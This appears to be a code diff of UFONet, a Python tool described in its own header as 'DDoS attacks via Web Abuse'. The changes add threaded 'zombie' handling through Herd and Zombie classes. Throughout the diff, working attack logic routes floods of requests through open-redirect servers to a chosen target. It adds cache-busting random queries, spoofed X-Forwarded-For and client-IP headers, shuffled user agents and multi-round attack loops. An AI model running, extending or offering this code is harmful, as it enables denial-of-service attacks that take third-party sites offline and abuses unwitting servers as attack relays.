@@ -1,33 +1,22 @@
 #!/usr/bin/env python 
 # -*- coding: utf-8 -*-"
 """
-UFONet - DDoS attacks via Web Abuse - 2013/2014 - by psy (epsylon@riseup.net)
+UFONet - DDoS attacks via Web Abuse - 2013/2014/2015 - by psy (epsylon@riseup.net)
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import os, sys, re, traceback, random, time
-import pycurl, StringIO, urllib, urllib2, cgi
+import os, sys, re, traceback, random, time, threading
+import StringIO, urllib, urllib2, cgi
 from urlparse import urlparse
 from random import randrange, shuffle
 from options import UFONetOptions
 from update import Updater
+from herd import Herd
+from zombie import Zombie
 
 DEBUG = 0
-
-class RandomIP(object):
-    """
-    Class to generate random valid IP's
-    """
-    def _generateip(self, string):
-        notvalid = [10, 127, 169, 172, 192]
-        first = randrange(1, 256)
-        while first is notvalid:
-            first = randrange(1, 256)
-        _ip = ".".join([str(first), str(randrange(1, 256)),
-        str(randrange(1, 256)), str(randrange(1, 256))])
-        return _ip
 
 class UFONet(object):
     def __init__(self):
@@ -69,6 +58,9 @@ class UFONet(object):
         self.delay = ''
         self.connection_failed = False
         self.total_possible_zombies = 0
+        self.herd = Herd()
+        self.sem = False
+
 
     def set_options(self, options):
         self.options = options
@@ -83,7 +75,7 @@ class UFONet(object):
     def banner(self):
         print '='*75, "\n"
         print "888     888 8888888888 .d88888b.  888b    888          888    "   
-        print "888     888 888        d88P" "Y888b  8888b   888          888    "
+        print "888     888 888        d88P Y888b 8888b   888          888    "
         print "888     888 888       888     888 88888b  888          888    "
         print "888     888 8888888   888     888 888Y88b 888  .d88b.  888888 "
         print "888     888 888       888     888 888 Y88b888 d8P  Y8b 888    "
@@ -108,6 +100,11 @@ class UFONet(object):
             options = self.create_options(opts)
             self.set_options(options)
         options = self.options
+
+        # start threads
+        if not self.options.threads:
+            self.options.threads=5 # default number of threads
+        self.sem = threading.Semaphore(self.options.threads)
 
         # check proxy options
         proxy = options.proxy
@@ -202,6 +199,7 @@ class UFONet(object):
                 test = self.testing(zombies)
             except Exception:
                 print ("\n[Error] - Something wrong testing!\n")
+                traceback.print_exc()
  
         # attack target -> exploit Open Redirect massively and connect all vulnerable servers to a target
         if options.target:
@@ -211,7 +209,7 @@ class UFONet(object):
                 attack = self.attacking(zombies)
             except Exception:
                 print ("\n[Error] - Something wrong attacking!\n")
-
+                traceback.print_exc()
         # inspect target -> inspect target's components sizes
         if options.inspect:
             try:
@@ -220,6 +218,7 @@ class UFONet(object):
                 print '='*22 + '\n'
                 inspection = self.inspecting()
             except Exception, e:
+                traceback.print_exc()
                 print ("[Error] - Something wrong inspecting... Not any object found!\n")
                 return #sys.exit(2)
 
@@ -241,7 +240,7 @@ class UFONet(object):
                 print("\nTrying to update automatically to the latest stable version\n")
                 Updater() 
             except:
-                print("\nSomething was wrong!. You should checkout UFONet manually with:\n")
+                print("\nSomething was wrong!. You should clone UFONet manually with:\n")
                 print("$ git clone https://github.com/epsylon/ufonet\n")
 
         # launch GUI/Web interface
@@ -270,6 +269,17 @@ class UFONet(object):
             except Exception, e:
                 print ("[Error] - Something wrong uploading!\n")
                 return #sys.exit(2)
+
+    # starting new zombie thread
+    def connect_zombies(self,zombie): 
+        z=Zombie(self,zombie)
+        t = threading.Thread(target=z.connect, name=zombie)
+        t.start()
+
+    # single connection handling
+    def connect_zombie(self,zombie): 
+        z=Zombie(self,zombie)
+        return z.connect()
 
     def uploading_list(self): 
         import gzip
@@ -447,6 +457,8 @@ class UFONet(object):
 #        for i in re.findall('''href=["'](.[^"']+)["']''', urllib.urlopen(myurl).read(), re.I):
 #            print i 
 
+
+# -> here we look for most interesting target url 
     def inspecting(self):
         # inspect HTML target's components sizes (ex: http://target.com/foo)           
         # [images, .mov, .webm, .avi, .swf, .mpg, .mpeg, .mp3, .ogg, .ogv, 
@@ -1219,13 +1231,15 @@ class UFONet(object):
                 txts[txt] = int(size)
                 print('(Size: ' + str(size) + ' Bytes)')
                 print '-'*12
-            #print txts
             biggest_txt = max(txts.keys(), key=lambda x: txts[x]) # search/extract biggest file (.txt) value from dict
             biggest_files[biggest_txt] = txts[biggest_txt] # add biggest file (.txt) to list
         except: # if not any .txt found, go for next
             pass
         print '='*80
-        #print biggest_files
+        if(biggest_files=={}):
+            print "\nNo link found on target\n\n"
+            print '='*80 + '\n'
+            sys.exit(2)
         biggest_file_on_target = max(biggest_files.keys(), key=lambda x: biggest_files[x]) # search/extract biggest file value from dict
         if biggest_file_on_target.startswith('http'):
             print ('=Biggest File: ' + biggest_file_on_target)
@@ -1270,7 +1284,7 @@ class UFONet(object):
             try:
                 num = int(options.num_results)
             except:
-                print("You should specify and integer!!!. Using default value: 10\n")
+                print("You should specify an integer!!!. Using default value: 10\n")
                 num = 10
         else:
             num = 10 
@@ -1379,141 +1393,6 @@ class UFONet(object):
                     if zombie not in zombies_on_file: # parse possible repetitions
                         zombie_list.write(zombie + os.linesep)
 
-    def connect_zombies(self, zombie):
-        # connect zombies and manage different options: HEAD, GET, POST,
-        # user-Agent, referer, timeout, retries, threads, delay..
-        options = self.options
-        c = pycurl.Curl()
-        if self.head == True:
-            c.setopt(pycurl.URL, zombie) # set 'zombie' target
-            c.setopt(pycurl.NOBODY, 1) # use HEAD
-        if self.payload == True:
-            payload = zombie + "http://www.google.es" #Open Redirect payload
-            c.setopt(pycurl.URL, payload) # set 'zombie' payload
-            c.setopt(pycurl.NOBODY, 0) # use GET
-        if self.external == True:
-            external_service = "http://www.downforeveryoneorjustme.com/"
-            if options.target.startswith('https://'): # fixing downforeveryoneorjustme url prefix problems
-                options.target = options.target.replace('https://','http://')
-            external = external_service + options.target
-            c.setopt(pycurl.URL, external) # external HEAD check before to attack
-            c.setopt(pycurl.NOBODY, 0) # use GET
-        if self.attack_mode == True:
-            if options.place:
-            # use zombie's vector to connect to a target's place and add a random query to evade cache
-                random_name_hash = random.randint(1, 100000000) 
-                random_hash = random.randint(1, 100000000)
-                if options.place.endswith("/"):
-                    options.place = re.sub('/$', '', options.place)
-                if options.place.startswith("/"):
-                    #print options.place
-                    if "?" in options.place:
-                        url_attack = zombie + options.target + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
-                    else:
-                        url_attack = zombie + options.target + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
-                else:
-                    if "?" in options.place:
-                        url_attack = zombie + options.target + "/" + options.place + "&" + str(random_name_hash) + "=" + str(random_hash)
-                    else:
-                        url_attack = zombie + options.target + "/" + options.place + "?" + str(random_name_hash) + "=" + str(random_hash)
-            else:                                    
-                url_attack = zombie + options.target # Use zombie vector to connect to original target url
-            #print url_attack
-            print "Payload:", url_attack
-            c.setopt(pycurl.URL, url_attack) # GET connection on target site
-            c.setopt(pycurl.NOBODY, 0)  # use GET
-        fakeheaders = ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8', 'Cache-control: no-cache', 'Pragma: no-cache', 'Pragma-directive: no-cache', 'Cache-directive: no-cache', 'Expires: 0'] # set fake headers (important: no-cache)
-        c.setopt(pycurl.FOLLOWLOCATION, 1) # set follow redirects
-        c.setopt(pycurl.MAXREDIRS, 10) # set max redirects
-        c.setopt(pycurl.SSL_VERIFYHOST, 0) # don't verify host
-        c.setopt(pycurl.SSL_VERIFYPEER, 0) # don't verify peer
-        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3) # sslv3
-        c.setopt(pycurl.COOKIEFILE, '/dev/null') # black magic
-        c.setopt(pycurl.COOKIEJAR, '/dev/null') # black magic
-        c.setopt(pycurl.FRESH_CONNECT, 1) # important: no cache!
-        if options.xforw: # set x-forwarded-for
-            generate_random_xforw = RandomIP()
-            xforwip = generate_random_xforw._generateip('')
-            xforwfakevalue = ['X-Forwarded-For: ' + str(xforwip)]
-            fakeheaders = fakeheaders + xforwfakevalue
-        if options.xclient: # set x-client-ip
-            generate_random_xclient = RandomIP()
-            xclientip = generate_random_xclient._generateip('')
-            xclientfakevalue = ['X-Client-IP: ' + str(xclientip)]
-            fakeheaders = fakeheaders + xclientfakevalue
-        if options.host: # set http host header
-            host_fakevalue = ['Host: ' + str(options.host)]
-            fakeheaders = fakeheaders + host_fakevalue
-        c.setopt(pycurl.HTTPHEADER, fakeheaders) # set fake headers
-        b = StringIO.StringIO()
-        c.setopt(pycurl.HEADERFUNCTION, b.write)
-        h = StringIO.StringIO()
-        c.setopt(pycurl.WRITEFUNCTION, h.write)
-        if options.agent: # set user-agent
-            c.setopt(pycurl.USERAGENT, options.agent)
-        else:
-            c.setopt(pycurl.USERAGENT, self.user_agent)
-        if options.referer: # set referer
-            c.setopt(pycurl.REFERER, options.referer)
-        else:
-            c.setopt(pycurl.REFERER, self.referer)
-        if options.proxy: # set proxy
-            c.setopt(pycurl.PROXY, options.proxy)
-        else:
-            c.setopt(pycurl.PROXY, '')
-        if options.timeout: # set timeout
-            c.setopt(pycurl.TIMEOUT, options.timeout)
-            c.setopt(pycurl.CONNECTTIMEOUT, options.timeout)
-        else:
-            c.setopt(pycurl.TIMEOUT, 10)
-            c.setopt(pycurl.CONNECTTIMEOUT, 10)
-        if options.delay: # set delay
-            self.delay = options.delay
-        else:
-            self.delay = 0
-        if options.retries: # set retries
-            self.retries = options.retries
-        else:
-            self.retries = 1
-        try: # try to connect
-            c.perform()
-            time.sleep(self.delay)
-            self.connection_failed = False
-        except Exception, e: # try retries
-            #print str(e)
-            for count in range(0, self.retries):
-                time.sleep(self.delay)
-                try:
-                    c.perform()
-                    self.connection_failed = False
-                except:
-                    self.connection_failed = True
-        if self.head == True: # HEAD reply
-            code_reply = c.getinfo(pycurl.HTTP_CODE)
-            reply = b.getvalue()
-            if options.verbose:
-                print "Reply:"
-                print "\n", reply
-            return code_reply
-        if self.external == True: # External reply
-            external_reply = h.getvalue()
-            if options.verbose:
-                print "Reply:"
-                print "\n", external_reply
-            return external_reply
-        if self.payload == True: # Payloads reply
-            payload_reply = h.getvalue()
-            if options.verbose:
-                print "Reply:"
-                print "\n", payload_reply
-            return payload_reply
-        if self.attack_mode == True: # Attack mode reply
-            attack_reply = h.getvalue()
-            if options.verbose:
-                print "Reply:"
-                print "\n", attack_reply
-            return attack_reply
-
     def testing(self, zombies):
         # test Open Redirect vulnerabilities on webapps and show statistics
         # HTTP HEAD check
@@ -1527,11 +1406,17 @@ class UFONet(object):
         print '-'*21
         for zombie in zombies:
             zombie = str(zombie)
-            t = urlparse(zombie)
             if zombie.startswith("http://") or zombie.startswith("https://"):
                 # send HEAD connection
                 self.head = True
-                code_reply = str(self.connect_zombies(zombie))
+                self.connect_zombies(zombie)
+        while self.herd.no_more_zombies() == False:
+            time.sleep(1)
+        for zombie in self.herd.done:
+            zombie = str(zombie)
+            t = urlparse(zombie)
+            if self.herd.get_result(zombie):
+                code_reply = self.herd.get_result(zombie)
                 self.head = False
                 if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401" or code_reply == "403" or code_reply == "405":
                     name_zombie = t.netloc
@@ -1554,6 +1439,7 @@ class UFONet(object):
                 print "Status: Malformed!"
                 num_failed_zombies = num_failed_zombies + 1
             print '-'*10
+        self.herd.reset()
         print '='*18
         print "OK:", num_active_zombies, "Fail:", num_failed_zombies
         print '='*18
@@ -1573,13 +1459,26 @@ class UFONet(object):
             zombie = str(zombie)
             t = urlparse(zombie)
             name_zombie = t.netloc
-            payload_zombie = zombie
-            print "Vector:", payload_zombie
+            #print "Vector:", zombie
             self.payload = True
             try:
-                payload_reply = str(self.connect_zombies(zombie))
+                self.connect_zombies(zombie)
             except:
-                payload_reply = ""
+                pass
+            self.payload = False
+        time.sleep(1)
+        while self.herd.no_more_zombies() == False:
+            time.sleep(1)
+        for zombie in self.herd.done:
+            zombie = str(zombie)
+            t = urlparse(zombie)
+            name_zombie = t.netloc
+            payload_zombie = zombie
+            payload_reply = ""
+            print "Vector:", payload_zombie
+            self.payload = True
+            if self.herd.get_result(zombie):
+                payload_reply = self.herd.get_result(zombie)
             self.payload = False
             if "http://www.google.es" in payload_reply: #Open Redirect reply
                 num_waiting_zombies = num_waiting_zombies + 1
@@ -1590,6 +1489,7 @@ class UFONet(object):
                 print "Status:", "Not ready..."
             army = army + 1
             print '-'*10
+        self.herd.reset()
         print '='*18
         print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
         print '='*18
@@ -1644,22 +1544,24 @@ class UFONet(object):
         # send HEAD connection
         self.head = True
         try:
-            reply = self.connect_zombies(target)
+            reply = self.connect_zombie(target)
             if reply:
                 print "From here: YES"
                 head_check_here = True
             else:
-                print "From Here: NO | WARNING: Check failed from your connection ;("
+                print "From Here: NO | WARNING: Check failed from your connection ;( " +target
                 head_check_here = False
         except Exception:
             print "From Here: NO | WARNING: Check failed from your connection ;("
+            if self.options.verbose:
+                traceback.print_exc()
             head_check_here = False
         self.head = False
         print '-'*21
         # check target on third party service (ex: http://www.downforeveryoneorjustme.com)
         self.external = True
         try:
-            external_reply = self.connect_zombies(target)
+            external_reply = self.connect_zombie(target)
             if "It's just you" in external_reply: # parse external service for correct reply
                 print "From exterior: YES"
                 head_check_external = True
@@ -1667,16 +1569,14 @@ class UFONet(object):
                 print "From exterior: NO | WARNING: Check failed from external services ;("
                 head_check_external = False
         except Exception: 
-            print "blah"
             print "From exterior: NO | WARNING: Check failed from external services ;("
             head_check_external = False
         self.external = False
-        print '-'*21, "\n"
+        print '-'*21
         # ask for start the attack
         if head_check_here == True or head_check_external == True:
             if not self.options.forceyes: 
                 start_reply = raw_input("Your target looks ONLINE!. Wanna start a DDoS attack? (y/N)\n")
-                print '-'*25
             else:
                 start_reply = "Y"
             if start_reply == "y" or start_reply == "Y":
@@ -1689,36 +1589,45 @@ class UFONet(object):
                 # start to attack the target with each zombie
                 zombies = self.extract_zombies() # extract zombies from file
                 total_zombie = len(zombies)
+                self.herd=Herd()
                 for i in range(0, int(total_rounds)):
+                    shuffle(zombies) # suffle zombies order, each round :-)
+                    print ("\x1b[2J\x1b[H")# clear screen (black magic)
+                    print '='*42
+                    print 'Starting round:', num_round, ' of ', total_rounds
+                    print '='*42
+                    self.herd.reset()
                     for zombie in zombies:
-                        print '='*45
-                        print "Zombie:", num_zombie, "| Round:", num_round, "| Total Rounds:", total_rounds
-                        print '='*45
                         t = urlparse(zombie)
                         name_zombie = t.netloc
                         self.attack_mode = True
-                        print "Name:", name_zombie
-                        attack_reply = self.connect_zombies(zombie)
-                        if self.connection_failed == False:
-                            print "Status: Hit!"
-                            num_hits = num_hits + 1
+                        if self.options.verbose:
+                            print zombie
                         else:
-                            print "Status: Failed :("
+                            print name_zombie
+                        self.user_agent = random.choice(self.agents).strip() # suffle user-agent
+                        self.connect_zombies(zombie)
+                    time.sleep(1)
+                    for zombie in self.herd.done:
+                        if self.herd.connection_failed(zombie) == False:
+                            num_hits = num_hits + 1
                         num_zombie = num_zombie + 1
                         if num_zombie > total_zombie:
                             num_zombie = 1
-                        print '-'*10
+                    while self.herd.no_more_zombies() == False:
+                        time.sleep(1)
                     num_round = num_round + 1
-                    shuffle(zombies) # suffle zombies order
+                    print "-"*21
                 attack_mode = False
-                print '='*21
-                print "Total hits:", num_hits
+                print ("\x1b[2J\x1b[H")
+                self.herd.dump()
+                print "\n" # gui related
                 print '='*21
                 print "\n[INFO] - Attack completed! ;-)\n"
             else:
                 print "\nBye!\n"
         else:
-            print "Your target looks OFFLINE!?\n"
+            print "Your target ("+target+") looks OFFLINE!?\n" 
             print '-'*25
             print "\nBye!\n"
 
